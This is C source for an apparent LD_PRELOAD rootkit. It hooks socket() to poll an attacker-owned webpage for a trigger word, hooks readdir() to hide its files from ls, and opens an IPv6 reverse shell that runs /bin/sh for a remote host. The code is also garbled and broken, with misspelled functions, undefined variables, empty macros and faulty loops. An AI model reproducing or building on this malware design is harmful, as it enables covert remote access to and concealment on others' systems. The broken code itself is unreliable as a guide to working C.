#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <regex.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#define REMOTE_HOST 
#define REMOTE_PORT
#define BIND_PORT 
#define ATTACKER_WEBSITE

/*overwrite socket syscall to check website for triggerword*/
int socket(int domain, int type, int protocol){
	int (*new_socket)(int domain, int type, int protocol);

	new_socket=dlysm(RTLD_NEXT, "socket");
	connect();
}

/*looks for keyword in attcker owned webpage which will trigger a connection (use pastebin or some google site) */
int connect(void)
{

	int port_num = 80;
	char *host = ATTACKER_WEBSITE;
	char *message_fmt ="GET /home\r\n\r\n";

	struct hostent *server;
	struct sockadd_in serv_addr;
	int sockfd, bytes, sent, received, total;
	char message[4096], response[4096];

	//create socket
	socketfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd<0) error("cant open socket");

	/*find ip address*/
	server = gethostbyname(host);
	if(server ==NULL) error("ERROR, no such host");

	memset(&serv_addr,0,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port_num);
	  memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);

	//conneeeeccct
	  connect(socketfd, (struct sockaddr *)&serv_addr, sizeof((serv_addr));

	 /*send request*/
	 sent =0;
	 do
	 {
	 	bytes =write(sockfd, message+sent, total-sent);
	 	if(bytes<0)
	 		error("Error sending request");
	 	sent+bytes;
	 } while(sent<total);


	 memset(response, 0, sizeof(response));
	 total = sizeof(response) -1;
	 recieved =0;
	 do{
	 	bytes = read(sockfd, response+received, total-sent);
	 	if(recieved==total)
	 		error("Not enough space in buffer");
	 } while (recieved<total);

	close(sockfd);

	/*regex resposne to find trigger word*/
	regex_t regex;
	char[] trigger_word; //word to trigger connection to attacker
	int status;
	status=regcomp(&regex, trigger_word , 0); //successfully found trigger word
	if(status ==0)
		ipv6();

	return 0;
}




/*hook write */
	ssize_t write(int fildes, const void *buf, size_t nbytes)
	{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");
	}	

/*hook readdir() to hide from ls*/
static struct dirent *(*old_readdir)(DIR * dir);
readdir(DIR * dirp)
{
	struct dirent *dir;
	int num = dlsym(RTLD_LAZY, "readdir");
	while(dir =old_readdir(dirp))
	{
		if((dir=NULL) && !(strcmp(dir->d_name, ".\0"))
			break;
	}
	return dir;

}

/*ipv6 bind shell*/

/*ipv6 reverse shell */
int ipv6(void)
{
	//imagine hardcoding your IP address

	char[] ip_address = "127.0.0.1";

	int s= socket(AF_INET6, SOCK_STREAM, 0);


	//create socket address

	struct sockaddr_in6 host_port;
	host_socket.sin6_family = AF_INET6;
	host_socket.sin6_port = htons(REMOTE_PORT);
	host_socket.sin6_addr.sin6_addr = REMOTE_HOST;

	//get current IP address
	struct ifreq ifr;
	ifr.ifr_addr.sa_family = AF_INET6;
	iotctl(s, SIOCGIFADDR, &ifr);


	struct sockaddr_in6 client_port;
	host_socket.sin6_family = AF_INET6;
	host_socket.sin6_port = htons(BIND_PORT);
	host_socket.sin6_addr.sin6_addr = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;


	bind(s, (struct sockaddr*)&client_port, sizeof(client_port));
	connect(s,(struct) sockadd_in6*)&host_socket, sizeof(host_socket));

	 exceve("/bin/sh", NULL, NULL);
	 close(s);

	  return 0;
	}



